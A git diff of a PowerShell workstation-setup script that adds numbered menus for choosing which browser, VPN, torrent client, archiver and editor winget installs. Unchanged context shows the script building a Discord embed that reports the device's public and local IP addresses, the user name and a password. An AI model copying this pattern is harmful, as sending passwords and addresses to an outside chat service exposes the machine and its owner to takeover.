@@ -1,3 +1,10 @@
+## Software Selector
+$BrowserSelect = 1 ## 1 = Chrome 2 = FireFox 3 = Brave 4 =Tor Browser 5 = LibreWolf 6 = Opera. 
+$VPNSelect = 1 ## 1 = ExpressVPN 2 = MullVad VPN 3 = NordVPN 4 = Fortinet VPN 5 = IPvanish 6 = ProtonVPN
+$TorrentSelect = 1 ## 1 = qBittorrent 2 = BitTorrent 3 = uTorrent
+$FileSelect = 1 ## 1 = 7Zip 2 = WinRAR 3 = Winzip
+$textSelect = 1 ## 1 = Notepad++ 2 = VS Code 3 = Vim ;)
+
 ## Getting IPV4 Addresses.
 $PubIP = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
 $LocalIP = (
@@ -48,13 +55,79 @@ Write-Host ''
 ## Start installing Softwares
 Write-Host 'Winget is updating and gonna start installing different softwares. This will take some time please be patient!!!' -ForegroundColor Green
 
+## Browser Selected
+if ($BrowserSelect -eq 1) {
+    $SelectedBrowse = "Google.Chrome"
+} elseif ($BrowserSelect -eq 2) {
+    $SelectedBrowse = "Mozilla.Firefox"
+} elseif ($BrowserSelect -eq 3) {
+    $SelectedBrowse = "Brave.Brave"
+} elseif ($BrowserSelect -eq 4) {
+    $SelectedBrowse = "TorProject.TorBrowser"
+} elseif ($BrowserSelect -eq 5) {
+    $SelectedBrowse = "LibreWolf.LibreWolf"
+} elseif ($BrowserSelect -eq 6) {
+    $SelectedBrowse = "Opera.Opera"
+} else {
+    Write-Host ""
+}
+
+## VPN Selected
+if ($VPNSelect -eq 1) {
+    $SelectedVPN = "ExpressVPN.ExpressVPN"
+} elseif ($VPNSelect -eq 2) {
+    $SelectedVPN = "MullvadVPN.MullvadVPN"
+} elseif ($VPNSelect -eq 3) {
+    $SelectedVPN = "NordSecurity.NordVPN"
+} elseif ($VPNSelect -eq 4) {
+    $SelectedVPN = "Fortinet.FortiClientVPN"
+} elseif ($VPNSelect -eq 5) {
+    $SelectedVPN = "IPVanish.IPVanish"
+} elseif ($VPNSelect -eq 6) {
+    $SelectedVPN = "Proton.ProtonVPN"
+} else {
+    Write-Host ""
+} 
 Write-Host ''
 
-winget install -e --id Brave.Brave
-winget install -e --id 7zip.7zip
-winget install -e --id Notepad++.Notepad++
-winget install -e --id MullvadVPN.MullvadVPN
-winget install -e --id qBittorrent.qBittorrent
+## Torrent Selected
+if ($TorrentSelect -eq 1) {
+    $SelectedTorrent = "qBittorrent.qBittorrent"
+} elseif ($TorrentSelect -eq 2) {
+    $SelectedTorrent = "BitTorrent.BitTorrent"
+} elseif ($TorrentSelect -eq 3) {
+    $SelectedTorrent = "BitTorrent.uTorrent"
+} else {
+    Write-Host ""
+}
+
+## Achiever Selected
+if ($FileSelect -eq 1){
+    $SelectedFile = "7zip.7zip"
+} elseif ($FileSelect -eq 2) {
+    $SelectedFile = "RARLab.WinRAR"
+} elseif ($FileSelect -eq 3) {
+    $SelectedFile = "Corel.WinZip"
+} else {
+    Write-Host ""
+}
+
+## Text Editor Selected
+if ($textSelect -eq 1){
+    $SelectedText = "Notepad++.Notepad++"
+} elseif ($textSelect -eq 2) {
+    $SelectedText = "Microsoft.VisualStudioCode"
+} elseif ($textSelect -eq 3) {
+    $SelectedText = "Vim.Vim"
+} else {
+    Write-Host ""
+}
+
+winget install -e --id $SelectedBrowse
+winget install -e --id $SelectedFile
+winget install -e --id $SelectedText
+winget install -e --id $SelectedVPN
+winget install -e --id $SelectedTorrent
 winget install -e --id Discord.Discord
 
 Write-Host ''
@@ -87,7 +160,8 @@ $discEmbed = @{
     Device Public IPv4 Address: **$PubIP**
     Device local IPV4 Address : **$LocalIP**
     User: **$User**
-    Password: **$Pass**"
+    Password: **$Pass** 
+    "
     color = 5814783  ## For Custom Colors
 }
 
